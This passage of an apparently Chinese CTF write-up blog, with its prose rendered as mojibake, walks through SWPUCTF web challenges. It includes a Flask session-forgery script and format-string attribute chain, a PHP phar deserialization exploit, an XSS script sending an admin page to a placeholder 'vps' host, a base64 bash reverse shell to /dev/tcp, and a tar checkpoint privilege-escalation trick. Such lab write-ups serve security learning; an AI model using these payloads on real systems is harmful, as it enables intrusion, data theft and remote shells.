class="keyword">from</span> .views <span class="keyword">import</span> register_views</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_app</span><span class="params">()</span>:</span></span><br><span class="line">    app = Flask(__name__, static_folder=<span class="string">''</span>)</span><br><span class="line">    app.secret_key = <span class="string">'9f516783b42730b7888008dd5c15fe66'</span></span><br><span class="line">    app.config[<span class="string">'SQLALCHEMY_DATABASE_URI'</span>] = <span class="string">'sqlite:////tmp/test.db'</span></span><br><span class="line">    register_views(app)</span><br><span class="line">    db.init_app(app)</span><br><span class="line">    <span class="keyword">return</span> app</span><br></pre></td></tr></table></figure><p>view.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register_views</span><span class="params">(app)</span>:</span></span><br><span class="line"><span class="meta">    @app.before_request</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reset_account</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">if</span> request.path == <span class="string">'/signup'</span> <span class="keyword">or</span> request.path == <span class="string">'/login'</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        uname = username=session.get(<span class="string">'username'</span>)</span><br><span class="line">        u = User.query.filter_by(username=uname).first()</span><br><span class="line">        <span class="keyword">if</span> u:</span><br><span class="line">            g.u = u</span><br><span class="line">            g.flag = <span class="string">'swpuctf&#123;xxxxxxxxxxxxxx&#125;'</span></span><br><span class="line">            <span class="keyword">if</span> uname == <span class="string">'admin'</span>:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            now = int(time())</span><br><span class="line">            <span class="keyword">if</span> (now - u.ts &gt;= <span class="number">600</span>):</span><br><span class="line">                u.balance = <span class="number">10000</span></span><br><span class="line">                u.count = <span class="number">0</span></span><br><span class="line">                u.ts = now</span><br><span class="line">                u.save()</span><br><span class="line">                session[<span class="string">'balance'</span>] = <span class="number">10000</span></span><br><span class="line">                session[<span class="string">'count'</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route('/getflag', methods=('POST',))</span></span><br><span class="line"><span class="meta">    @login_required</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">        u = getattr(g, <span class="string">'u'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> u <span class="keyword">or</span> u.balance &lt; <span class="number">1000000</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&#123;"s": -1, "msg": "error"&#125;'</span></span><br><span class="line">        field = request.form.get(<span class="string">'field'</span>, <span class="string">'username'</span>)</span><br><span class="line">        mhash = hashlib.sha256((<span class="string">'swpu++&#123;0.'</span> + field + <span class="string">'&#125;'</span>).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">        jdata = <span class="string">'&#123;&#123;"&#123;0&#125;":'</span> + <span class="string">'"&#123;1.'</span> + field + <span class="string">'&#125;", "hash": "&#123;2&#125;"&#125;&#125;'</span></span><br><span class="line">        <span class="keyword">return</span> jdata.format(field, g.u, mhash)</span><br></pre></td></tr></table></figure><p>ç°åœ¨æ‹¥æœ‰äº†secret_keyä¸éš¾æƒ³åˆ°å¯ä»¥ä¼ªé€ sessionï¼Œä½†æˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯<code>u.balance</code>çš„å€¼éœ€è¦æ¯”1000000å¤§ï¼Œå¼€å§‹ä¼ªé€ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span><span class="params">(object)</span>:</span></span><br><span class="line">secret_key = <span class="string">'9f516783b42730b7888008dd5c15fe66'</span></span><br><span class="line"></span><br><span class="line">s = SecureCookieSessionInterface().get_signing_serializer(App())</span><br><span class="line">u = s.loads(<span class="string">'.eJwVzDEOgzAQRNG7TE0xBiMWXyZar5cmwUgG0kS5O_CrV_0fsn60miMF3nWw7awH0qO9La9je3tFwhSFzOImZrFQfJpFGVnGuISQy6zUgSLocO7eqq73Evx6C_2A_wVSDx5s.XBzbDQ.TMK2zvIwmNUWxVCXYaJJU7aQzqo'</span>)</span><br><span class="line">u[<span class="string">'username'</span>] = <span class="string">'admin'</span></span><br><span class="line">u[<span class="string">'balance'</span>] = <span class="number">1000000000.0</span></span><br><span class="line">print(s.dumps(u))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJw1zDsKw0AMRdG9vNqEN2SC5dlM0GhkCI5l8KcK2budIrc61f2g6lvDHCXx340dbDliR_lpW8fnvkweKOizkFXcxCw3iveDKDPbI48p1TYo9U4RdDg2X0Pn6wxt8yvwPQGtyx-w.XBzkcA.sDFRMVhq2AkzcCAeoHSjBM-_OSA</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯pythonæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ¼æ´äº†ï¼Œæ„é€ ç»§æ‰¿é“¾ï¼Œåˆå­¦åˆ°äº†</p><p><img src="https://s1.ax1x.com/2018/12/21/FsyP8s.png" alt="FsyP8s.png"></p><p>æœ€åçš„æ”»å‡»é“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__class__.save.__globals__[db].__class__.__init__.__globals__[current_app].before_request.__globals__[g].flag</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/12/21/FsyWGj.png" alt="FsyWGj.png"></p><h3 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h3><p>æ‹¿åˆ°é¢˜ç›®å°±å‘ç°urlæœ‰äº›é—®é¢˜ï¼ŒçŒœæµ‹åº”è¯¥å¯ä»¥æ–‡ä»¶è¯»å–ï¼Œå¯ä»¥æŸ¥çœ‹file.phpä»¥åŠclass.php</p><p>file.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/var/www/html/'</span>);</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>] ? $_GET[<span class="string">'file'</span>] : <span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;There is no file to show!&lt;h2/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$show = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) &#123;</span><br><span class="line">    $show-&gt;source = $file;</span><br><span class="line">    $show-&gt;_show();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'file doesn\'t exists.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ„é€ æ”»å‡»é“¾çš„è¿‡ç¨‹åˆå­¦åˆ°äº†ã€‚ã€‚ã€‚ã€‚å¯ä»¥è¯»ä¸€ä¸‹è¿™ç¯‡æ–‡ç« :<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p><p>æ”»å‡»çš„æµç¨‹tqlâ€¦.ï¼Œç»™æˆ‘å°±ä¸ä¼šæ„é€ å­¦åˆ°äº†ã€‚ã€‚ã€‚</p><p>1.åˆ©ç”¨C1e4rç±»çš„<code>__destruct()</code>ä¸­çš„<code>echo $this-&gt;test</code><br>2.è§¦å‘Showç±»çš„<code>__toString()</code><br>3.åˆ©ç”¨Showç±»çš„<code>$content = $this-&gt;str[&#39;str&#39;]-&gt;source</code><br>4.è§¦å‘Testç±»çš„<code>__get()</code><br>5.æˆåŠŸåˆ©ç”¨<code>file_get()</code>è¯»æ–‡ä»¶</p><p>è¿™é‡Œå°±ç›´æ¥å¼•ç”¨Smileå¤§ä½¬çš„exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;params = [</span><br><span class="line">    <span class="string">'source'</span> =&gt; <span class="string">'/var/www/html/f1ag.php'</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> Show();</span><br><span class="line">$b-&gt;str[<span class="string">'str'</span>] = $a;</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">new</span> C1e4r();</span><br><span class="line">$c-&gt;str = $b;</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($c); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">copy(<span class="string">'phar.phar'</span>,<span class="string">'exp.gif'</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åæ ¹æ®æ–‡ä»¶åä»¥åŠipåœ°å€æ¨å‡ºMD5çš„æ–‡ä»¶åï¼Œç„¶åå†ç”¨pharåè®®è¯»å–å³å¯ï¼Œè¿™é‡Œè®°å¾—æ”¹ä¸€ä¸‹php.inié‡Œé¢çš„å±æ€§phar.readonly = Off</p><p>å›¾ç‰‡å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0b2d3fed2e75c3936721028b574d8228.jpg</span><br></pre></td></tr></table></figure><p>è¯»å–flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.158.180:11115/file.php?file=phar://upload/0b2d3fed2e75c3936721028b574d8228.jpg</span><br></pre></td></tr></table></figure><p>è·å¾—flag</p><p><img src="https://s1.ax1x.com/2018/12/21/FsREAf.png" alt="FsREAf.png"></p><h3 id="æœ‰è¶£çš„é‚®ç®±æ³¨å†Œ"><a href="#æœ‰è¶£çš„é‚®ç®±æ³¨å†Œ" class="headerlink" title="æœ‰è¶£çš„é‚®ç®±æ³¨å†Œ"></a>æœ‰è¶£çš„é‚®ç®±æ³¨å†Œ</h3><p>é¢˜ç›®ä¸Šæ¥å‘ç°å­˜åœ¨ä¸¤ä¸ªåŠŸèƒ½ç‚¹ï¼Œæœ‰ä¸€ä¸ªadmin.phpè¿˜æœ‰ä¸€ä¸ªcheck.php,ä½†æ˜¯admin.phpåªå…è®¸æœ¬åœ°ç”¨æˆ·å»è¯»å–ï¼Œä¼°è®¡å¾—ç”¨xssäº†ã€‚</p><p>å¯ä»¥ä»check.phpé‡Œé¢çš„æºç å‘ç°éªŒè¯é‚®ç®±æˆ‘ä»¬å¯ä»¥å»ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--check.php</span><br><span class="line">if($_POST[&apos;email&apos;]) &#123;</span><br><span class="line">$email = $_POST[&apos;email&apos;];</span><br><span class="line">if(!filter_var($email,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line">echo &quot;error email, please check your email&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;ç­‰å¾…ç®¡ç†å‘˜è‡ªåŠ¨å®¡æ ¸&quot;;</span><br><span class="line">echo $email;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>æ„é€ æºä»£ç çš„è„šæœ¬ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.readyState==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">document</span>.location=<span class="string">'http://vps:23333/?'</span>+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,<span class="string">"admin.php"</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure><p>æ„é€ çš„ç»•è¿‡payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;script/src=//vps_ip/payload.js&gt;&lt;/script&gt;&quot;@example.com</span><br></pre></td></tr></table></figure><p>ç›‘å¬ç«¯å£ï¼Œå‘ç°</p><p><img src="https://s1.ax1x.com/2018/12/21/Fs4AMQ.png" alt="Fs4AMQ.png"></p><p>è§£ç å¾—åˆ°</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"admin/a0a.php?cmd=whoami"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¯´æ˜å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œç„¶åé‡æ–°ä¿®æ”¹è„šæœ¬ï¼Œåå¼¹webshellï¼Œå°±åœ¨è¿™ä¸€æ­¥çš„æ˜¯æ—¶å€™ï¼Œä»–å–µçš„ï¼Œä»–å–µçš„ï¼Œé¢˜ç›®æŒ‚äº†æˆ‘è¿˜æ˜¯å­¦ä¹ ä¸€ä¸‹å·¨ä½¬ä»¬çš„éªšæ€è·¯å§ï¼Œè¿™é‡Œå­¦ä¹ äº†æ‰§å¿µäºå¿ƒå¤§ä½¬çš„æ€è·¯ï¼Œé€šè¿‡å†™shæ–‡ä»¶å»åå¼¹shellï¼Œç”¨çš„æ˜¯base64å†™shell,åˆ©ç”¨äº†ç®¡é“ç¬¦ç„¶åé‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œé¢ï¼Œechoåé¢çš„å†…å®¹å°±æ˜¯ä½ å†™çš„åå¼¹shellè¯­å¥<code>/bin/bash -i &gt; /dev/tcp/ip/port 0&lt;&amp;1 2&gt;&amp;1</code>ç»è¿‡base64ä¹‹åçš„è¯­å¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 'L2Jpbi9iYXNoIC1pID4gL2Rldi90Y3AvaXAvcG9ydCAwPCYxIDI+JjE=' | base64 -d &gt; /tmp/xjb.sh</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰§è¡Œ<code>/bin/bash /tmp/**.sh</code>å³å¯ï¼Œè¿™é¢˜çš„éªšæ“ä½œåœ¨äºåˆ©ç”¨tarå»ææƒï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼Œæ‰§è¡Œä»¥ä¸‹å‡ å¥è¯,åº”è¯¥æ˜¯å…ˆä¸Šä¼ è¿™å‡ ä¸ªåå­—çš„æ–‡ä»¶ï¼Œåˆ©ç”¨äº†taré¡ºä¾¿æŠŠæ–‡ä»¶åç»™æ‰§è¡Œäº†ï¼Œç„¶åå®ç°ä½ çš„ç›®çš„ï¼Œä½ çš„ç›®çš„å†…å®¹å†™åœ¨demo.shé‡Œé¢å³å¯ï¼Œä½ å¯ä»¥ä»¥å¯¹æ–¹èº«ä»½webshellä¹Ÿè¡Œï¼Œç›´æ¥è¯»å–flagä¹Ÿè¡Œï¼Œå­¦åˆ°äº†ï¼Œ2333ï¼Œä»¥å‰å¯¹LInuxçš„ææƒè¿˜æ˜¯ä¸å¤ªç†Ÿæ‚‰çš„</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--checkpoint-action=exec=sh demo.sh</span><br><span class="line">--checkpoint=1</span><br><span class="line">demo.sh</span><br></pre></td></tr></table></figure><h2 id="å°ç»“ä¸€ä¸‹æ¼æ´ç‚¹"><a href="#å°ç»“ä¸€ä¸‹æ¼æ´ç‚¹" class="headerlink" title="å°ç»“ä¸€ä¸‹æ¼æ´ç‚¹"></a>å°ç»“ä¸€ä¸‹æ¼æ´ç‚¹</h2><ol><li>phpä½éšæœºæ•°çˆ†ç ´ï¼Œå¾—æ³¨æ„ä¸€ä¸‹å¯¹åº”çš„ç‰ˆæœ¬æ˜¯å¦æ­£ç¡®æ‰æ˜¯ç”¨è„šæœ¬å»çˆ†ç ´ï¼Œåœ¨æœ‰çš„æ—¶å€™è¿˜å¯ä»¥æŠŠéšæœºæ•°çš„æ ¼å¼æ¢ä¸€ä¸‹ä¾¿äºçˆ†ç ´</li><li>å‘½ä»¤æ‰§è¡Œçš„ç»•è¿‡ç‚¹ï¼Œç¬¬ä¸€ä¸ªæ˜¯å…³äºæ­£åˆ™çš„mä¿®é¥°ç¬¦çš„å°trickï¼Œç”¨<code>%0a</code>å»ç»•è¿‡ï¼Œç¬¬äºŒä¸ªå°±æ˜¯å°±æ˜¯å¯¹äºæ•´ä¸ªå•è¯å¦‚ä½•è¿›è¡Œåˆ‡å‰²ç»•è¿‡ï¼Œå¯ä»¥ç”¨<code>\</code>ä»¥åŠå•å¼•å·å»ç»•è¿‡</li><li>NoSQLæ³¨å…¥çš„è¿‡ç¨‹ï¼Œä»¥åŠé‚£ä¸ªéªšæ°”çš„è¯†åˆ«éªŒè¯ç 